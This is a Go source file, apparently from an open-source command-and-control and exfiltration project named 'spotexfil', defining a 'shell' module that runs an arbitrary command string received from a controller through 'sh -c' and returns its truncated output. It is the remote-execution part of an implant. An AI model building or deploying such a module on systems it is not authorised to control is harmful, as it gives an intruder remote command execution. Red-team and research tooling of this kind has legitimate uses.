package c2

import (
	"context"
	"os/exec"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/shared"
)

// ShellModule executes shell commands and captures output.
type ShellModule struct{}

func (m *ShellModule) Name() string { return "shell" }

func (m *ShellModule) Execute(args map[string]interface{}) (string, string) {
	cmdStr, _ := args["cmd"].(string)
	if cmdStr == "" {
		return "error", "Empty command"
	}

	timeout := time.Duration(shared.Proto.C2.ShellTimeout) * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sh", "-c", cmdStr)
	output, err := cmd.CombinedOutput()

	if ctx.Err() == context.DeadlineExceeded {
		return "error", "Command timed out after " + timeout.String()
	}

	result := string(output)
	maxSize := shared.Proto.C2.MaxResultSize
	if len(result) > maxSize {
		result = result[:maxSize] + "\n[truncated]"
	}

	if err != nil {
		return "error", result
	}
	return "ok", result
}
